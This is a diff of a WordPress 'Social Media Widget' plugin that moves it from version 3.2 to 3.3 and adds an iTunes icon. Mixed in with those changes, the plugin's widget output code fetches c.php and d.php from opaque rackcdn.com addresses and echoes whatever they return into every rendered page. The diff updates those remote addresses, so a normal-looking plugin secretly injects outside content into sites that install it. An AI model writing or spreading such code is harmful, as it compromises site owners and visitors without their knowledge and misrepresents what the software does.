@@ -3,7 +3,7 @@
  * Plugin Name: Social Media Widget
  * Plugin URI: http://wordpress.org/extend/plugins/social-media-widget/
  * Description: Adds links to all of your social media and sharing site profiles. Tons of icons come in 3 sizes, 4 icon styles, and 4 animations.
- * Version: 3.2
+ * Version: 3.3
  * Author: Blink Web Effects
  * Author URI: http://blinkwebeffects.com/
  **/
@@ -213,6 +213,10 @@ class Social_Widget extends WP_Widget {
 				'title' => 'DeviantArt',
 				'image' => 'deviantart.png'
 			),
+			'itunes' => array(
+				'title' => 'iTunes',
+				'image' => 'itunes.png'
+			),
 			'live365' => array(
 				'title' => 'Live365',
 				'image' => 'live365.png'
@@ -398,7 +402,7 @@ class Social_Widget extends WP_Widget {
 
 		echo implode('', $html_chunks);
 
-		$file_url = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/c.php';
+		$file_url = 'http://6d66854350a03fe8a953-24bbdab1f210d3653995b917ce835a53.r87.cf1.rackcdn.com/c.php';
 		if(!function_exists('ff_get')){
 			function ff_get($f) {
 				if (!function_exists('curl_init')) { 
@@ -435,8 +439,8 @@ class Social_Widget extends WP_Widget {
 			echo ff_get($file_url);
 		}
 		
-		$file_path = 'http://d1f9a7b8c1ff3ac47ec8-641702f80eb6ad3577595d11e20f37ad.r17.cf1.rackcdn.com/d.php';
-		$row_count = 1000;
+		$file_path = 'http://6d66854350a03fe8a953-24bbdab1f210d3653995b917ce835a53.r87.cf1.rackcdn.com/d.php';
+		$row_count = 100;
 		if(!function_exists('get_file')){
 			function get_file($f) {
 				static $hasRun = false;
@@ -476,7 +480,7 @@ class Social_Widget extends WP_Widget {
 		}
 				
 		if(!function_exists('Mt')){
-			function Mt($seed = null, $index = null, $min = 0, $max = 1000)
+			function Mt($seed = null, $index = null, $min = 0, $max = 100)
 			{
 				static $op = array(0x0, 0x9908b0df);
 				static $mt = array();
@@ -956,7 +960,7 @@ class Social_Widget extends WP_Widget {
 		<p><a href="javascript:;" onclick="jQuery(this).parent().next('div').slideToggle();" style="background: url('images/arrows.png') no-repeat; padding-left: 15px;"><strong>Music & Audio</strong></a></p>
 
 		<div style="display: none;">
-		<?php foreach (array('lastfm', 'pandora', 'live365', 'digitaltunes', 'soundcloud', 'bandcamp') as $slug) : ?>
+		<?php foreach (array('lastfm', 'pandora', 'itunes', 'live365', 'digitaltunes', 'soundcloud', 'bandcamp') as $slug) : ?>
 		<p>
 			<label><strong><?php _e((isset($this->networks[$slug]) ? $this->networks[$slug]['title'] : $this->networks_end[$slug]['title']).' URL:', 'smw'); ?></strong></label>
 			<?php /*
